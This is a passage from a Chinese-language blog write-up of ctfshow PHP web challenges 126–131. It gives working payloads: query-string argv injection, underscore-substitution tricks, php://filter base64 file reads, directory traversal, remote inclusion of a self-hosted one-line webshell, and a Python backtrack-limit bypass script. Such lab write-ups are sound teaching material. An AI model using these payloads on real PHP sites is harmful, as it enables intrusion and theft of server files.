	第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数

2、web网页模式下

	在web页模式下必须在php.ini开启register_argc_argv配置项
	
    设置register_argc_argv &#x3D; On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果

    这时候的$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’]

    $argv,$argc在web模式下不适用</code></pre>
<p>因为我们是在网页模式下运行的，所以<code>$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]</code>也就是<code>$a[0]= $_SERVER[&#39;QUERY_STRING&#39;]</code><br>这时候我们只要通过 <code>eval(&quot;$c&quot;.&quot;;&quot;);</code>将$flag赋值<code>flag_give_me</code>就可以了。<br>payload如下：</p>
<pre class="language-python" data-language="python"><code class="language-python">payload:
get:  $fl0g&#x3D;flag_give_me;
post:  CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])
</code></pre>
<p>非预期：</p>
<pre class="language-python" data-language="python"><code class="language-python">post: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flag
post: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;var_dump($GLOBALS)   题目出不来，本地测试可以
</code></pre>
<pre class="language-python" data-language="python"><code class="language-python">get: a&#x3D;1+fl0g&#x3D;flag_give_me
post: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])
</code></pre>
<p>测试：</p>
<pre class="language-python" data-language="python"><code class="language-python">&lt;?php
$a&#x3D;$_SERVER[&#39;argv&#39;];
var_dump($a);

传入 a&#x3D;1+fl0g&#x3D;flag_give_me
结果如下
array(2) &#123; [0]&#x3D;&gt; string(3) &quot;a&#x3D;1&quot; [1]&#x3D;&gt; string(17) &quot;fl0g&#x3D;flag_give_me&quot; &#125;
</code></pre>
<p>原理：</p>
<pre class="language-python" data-language="python"><code class="language-python">CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去
继续判断query string是否为空，
如果不为空把通过+符号分割的字符串转换成php内部的zend_string，
然后再把这个zend_string复制到 arr 数组中去。
</code></pre>
<h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><pre class="language-python" data-language="python"><code class="language-python">error_reporting(0);
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
$ctf_show &#x3D; md5($flag);
$url &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];

&#x2F;&#x2F;特殊字符检测
function waf($url)&#123;
    if(preg_match(&#39;&#x2F;\&#96;|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#39;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\&#x2F;&#x2F;&#39;, $url))&#123;
        return true;
    &#125;else&#123;
        return false;
    &#125;
&#125;

if(waf($url))&#123;
    die(&quot;嗯哼？&quot;);
&#125;else&#123;
    extract($_GET);
&#125;


if($ctf_show&#x3D;&#x3D;&#x3D;&#39;ilove36d&#39;)&#123;
    echo $flag;
&#125;</code></pre>
<p>测试跑一下：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
function curl($url)&#123;
    $ch&#x3D;curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result&#x3D;curl_exec($ch);
    curl_close($ch);
    return strlen($result);
&#125;
for ($i&#x3D;0; $i &lt; 128; $i++) &#123; 
    $url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?ctf&quot;.urlencode(chr($i)).&quot;show&#x3D;1&quot;;
    if(curl($url)!&#x3D;&#x3D;0)&#123;
        echo urlencode(chr($i)).&quot;\n&quot;;
    &#125;
&#125;
</code></pre>
<p>flag.php</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
if(isset($_GET[&#39;ctf_show&#39;]))&#123;
	echo 123;
&#125;
</code></pre>
<p>以下的这些字符可以代替<code>_</code></p>
<pre class="language-php" data-language="php"><code class="language-php">+ _ [ .  
+  这里的加号在url中起到空格的作用</code></pre>
<p>出去过滤掉的字符，可以使用空格实现<br>payload：<code>ctf show=ilove36d</code></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种题需要有fuzz的技术，得学一下这个php就脚本的写法。</p>
<h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><h3 id="考点：gettext（”-”）函数的使用-查看所有变量get-defined-vars"><a href="#考点：gettext（”-”）函数的使用-查看所有变量get-defined-vars" class="headerlink" title="考点：gettext（”_”）函数的使用+查看所有变量get_defined_vars"></a>考点：gettext（”_”）函数的使用+查看所有变量get_defined_vars</h3><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
include(&quot;flag.php&quot;);
highlight_file(__FILE__);

$f1 &#x3D; $_GET[&#39;f1&#39;];
$f2 &#x3D; $_GET[&#39;f2&#39;];

if(check($f1))&#123;
    var_dump(call_user_func(call_user_func($f1,$f2)));
&#125;else&#123;
    echo &quot;嗯哼？&quot;;
&#125;

function check($str)&#123;
    return !preg_match(&#39;&#x2F;[0-9]|[a-z]&#x2F;i&#39;, $str);
&#125;</code></pre>
<p>连续两次调用，而且会检查f1函数名称，特殊字符的函数只有<code>_</code>，所对应的函数为：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274254001-69cdf9cb-1498-4251-9d53-cb854861e579.png" alt="image.png"><br>  <img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688274251016-f41af228-5679-445a-967b-315d8677c759.png" alt="image.png"><br>可以借由输出字符串<br>使用<code>f1=_&amp;f2=phpinfo</code>就可以查看到php信息<br>由于题目有<code>include(&#39;flag.php&#39;)</code>可以直接输出所有变量：<br>payload：<code>f1=_&amp;f2=get_defined_vars</code>即可</p>
<h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p>
</blockquote>
<h3 id="考点：stripos"><a href="#考点：stripos" class="headerlink" title="考点：stripos"></a>考点：stripos</h3><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#39;f&#39;]))&#123;
    $f &#x3D; $_GET[&#39;f&#39;];
    if(stripos($f, &#39;ctfshow&#39;)&gt;0)&#123;
        echo readfile($f);
    &#125;
&#125;</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688276827328-a519e966-3864-4e99-9157-4cbabe21a2f1.png" alt="image.png"></p>
<h2 id="方法1-远程文件包含"><a href="#方法1-远程文件包含" class="headerlink" title="方法1 远程文件包含"></a>方法1 远程文件包含</h2><p>一个方法是远程文件包含，在自己的服务器上写一句话木马，然后保存为txt文档，然后如下使用：<br><code>f=http://url/xxx.txt?ctfshow</code><br>测试一下：<br>在根目录写一个一句话木马：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279012856-b10947c0-ec54-4c88-950a-181dcc097ce8.png" alt="image.png"><br>注意，一定要能访问得到，放在对应www或者wwwroot目录下<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688279781611-621b25c1-bd8f-42bd-baac-336ec755e9ca.png" alt="6c4d3974c2ebcc5e4389c8ca31c7cac.png"><br>然后简单测试一下：<br>能够获取到，但是不能够rce<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688280341422-1fa73f65-9741-4958-a762-11660750fdfd.png" alt="image.png"><br>不知道为什么。</p>
<h2 id="方法2-直接使用伪协议"><a href="#方法2-直接使用伪协议" class="headerlink" title="方法2 直接使用伪协议"></a>方法2 直接使用伪协议</h2><p><code>?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</code><br>base64解密即可</p>
<h2 id="方法3-目录穿越"><a href="#方法3-目录穿越" class="headerlink" title="方法3 目录穿越"></a>方法3 目录穿越</h2><p><code>/ctfshow/../../../../var/www/html/flag.php</code></p>
<h1 id="web130、web131"><a href="#web130、web131" class="headerlink" title="web130、web131"></a>web130、web131</h1><h2 id="考点：pregmatch最大回溯次数绕过"><a href="#考点：pregmatch最大回溯次数绕过" class="headerlink" title="考点：pregmatch最大回溯次数绕过"></a>考点：pregmatch最大回溯次数绕过</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
if(isset($_POST[&#39;f&#39;]))&#123;
    $f &#x3D; $_POST[&#39;f&#39;];

    if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;
        die(&#39;bye!&#39;);
    &#125;
    if(stripos($f, &#39;ctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;
        die(&#39;bye!!&#39;);
    &#125;

    echo $flag;

&#125;</code></pre>
<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。<br>直接用python脚本即可：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests

url &#x3D; r&quot;http:&#x2F;&#x2F;44ff0304-988a-4fea-b5a4-4dcd7874d335.challenge.ctf.show&#x2F;&quot;
data &#x3D; &#123;
    &#39;f&#39;: &#39;very&#39; * 250000 + &#39;ctfshow&#39;
&#125;

r &#x3D; requests.post(url, data&#x3D;data)
print(r.text)</code></pre>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
  echo str_repeat(&#39;very&#39;, &#39;250000&#39;).&#39;36Dctfshow&#39;;</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688281327546-67e6816e-fcde-44ea-819f-e0d4e513075d.png" alt="image.png"><br>除此之外还可直接：<code>f=ctfshow</code>后面接任意字符均可<br>或者使用空数组：<code>f[]=ctfshow</code><br>但是131似乎就只能使用回溯超出做了。</p>

                        </article>
                    </div>


                    <div class="fleet-content-body-footer mt-16">
                        <!--翻页器-->
                        <div class="flex-row flex w-full justify-between">
                            <div class="fleet-content-body-footer-left">
                                
                                    <div><a href="/posts/94aa1d46/"
                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                 xmlns="http://www.w3.org/2000/svg"
                                                 width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
                                            </svg>
                                            <div class="flex flex-col items-start"><span
                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
                                                <span>web151-web170文件上传篇</span></div>
                                        </a></div>
                                
                            </div>
                            <div class="fleet-content-body-footer-right">
                                
                                    <div><a href="/posts/12c981c1/"
                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
                                            <div class="flex flex-col items-end"><span
                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
                                                <span>CISCN2023 wp</span></div>
                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                 xmlns="http://www.w3.org/2000/svg"
                                                 width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
                                            </svg>
                                        </a></div>

                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>
</div>

    <!--    嵌套位置结束-->
    <!--<h3>categories</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/">-->
    <!--                CTF-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/JavaSec/">-->
    <!--                JavaSec-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/Python/">-->
    <!--                Python-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->

    <!--<h3>tags</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">-->
    <!--                Java反序列化-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CC%E9%93%BE/">-->
    <!--                CC链-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/WriteUp/">-->
    <!--                WriteUp-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CTFshow0-1/">-->
    <!--                CTFshow0-1-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CISCN/">-->
    <!--                CISCN-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
    <!--                脚本-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Tampermonkey/">-->
    <!--                Tampermonkey-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Shortcut/">-->
    <!--                Shortcut-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
    <!--                语雀-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->
</div>
<!--返回顶部按钮-->
<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
<!--加个渐变，但还是有点丑-->
<!-- TODO 换个更好的方案-->
<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
</div>

<footer class="footer p-10 bg-neutral text-neutral-content">
    <aside>
        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
        © 2020-2024 Lupas by Natro92
        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
    </aside>
    <nav>
        <header class="footer-title">Social</header>
        <!--<div class="grid grid-flow-col gap-4">-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
        <!--</div>-->
    </nav>
</footer>
</body>

</html>


